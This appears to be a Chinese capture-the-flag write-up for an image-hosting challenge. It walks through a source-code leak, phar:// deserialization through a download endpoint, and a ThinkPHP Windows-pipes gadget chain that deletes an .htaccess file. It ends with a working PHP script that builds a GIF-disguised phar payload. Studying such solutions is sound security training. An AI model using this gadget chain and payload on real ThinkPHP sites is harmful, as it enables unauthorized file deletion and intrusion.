# 简易图床wp
## 0x00 寻找源码
访问`http://xxxxx/www.zip`获取源码
## 0x01 代码审计
直接访问`flag/flag`发现返回`403 forbidden`
查看`flag/.htaccess`,发现403的原因
```
<Files ~ "flag">
   Deny from all
</Files>
```
有文件上传点，但是文件名和后缀都改了，无法直接上传php文件拿shell
```php
public function download(Request $request)
    {
        //..
        $content = file_get_contents($url);
        //..
    }
```
发现只需要上传的phar文件，可触发反序列化。
## 0x02 pop链寻找
`\think\process\pipes\Windows`

```php
public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                unlink($filename);
            }
        }
        $this->files = [];
    }
```
## 0x03 解题思路
上传一个phar文件使其触发反序列化，
访问`http://..../download?url=phar://you_upload_file`
删除.htaccess，拿flag
## 0x04 exp

```php
<?php
$a = "TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjo4OntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjE2OiIuL2ZsYWcvLmh0YWNjZXNzIjt9czo0MDoiAHRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cwBmaWxlSGFuZGxlcyI7YTowOnt9czozODoiAHRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cwByZWFkQnl0ZXMiO2E6Mjp7aToxO2k6MDtpOjI7aTowO31zOjQyOiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGRpc2FibGVPdXRwdXQiO2I6MTtzOjU6InBpcGVzIjthOjA6e31zOjE0OiIAKgBpbnB1dEJ1ZmZlciI7aToxO3M6ODoiACoAaW5wdXQiO047czozNDoiAHRoaW5rXHByb2Nlc3NccGlwZXNcUGlwZXMAYmxvY2tlZCI7YjoxO30=";
/*
O:27:"think\\process\\pipes\\Windows":8:{s:34:"\x00think\\process\\pipes\\Windows\x00files";a:1:{i:0;s:16:"./flag/.htaccess";}s:40:"\x00think\\process\\pipes\\Windows\x00fileHandles";a:0:{}s:38:"\x00think\\process\\pipes\\Windows\x00readBytes";a:2:{i:1;i:0;i:2;i:0;}s:42:"\x00think\\process\\pipes\\Windows\x00disableOutput";b:1;s:5:"pipes";a:0:{}s:14:"\x00*\x00inputBuffer";i:1;s:8:"\x00*\x00input";N;s:34:"\x00think\\process\\pipes\\Pipes\x00blocked";b:1;}
*/
$b = unserialize(base64_decode($a));
$filename = "poc.phar";
file_exists($filename) ? unlink($filename) : null;
$phar=new Phar($filename);
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ");
$phar->setMetadata($b);
$phar->addFromString("foo.gif","bar");
$phar->stopBuffering();
?>
```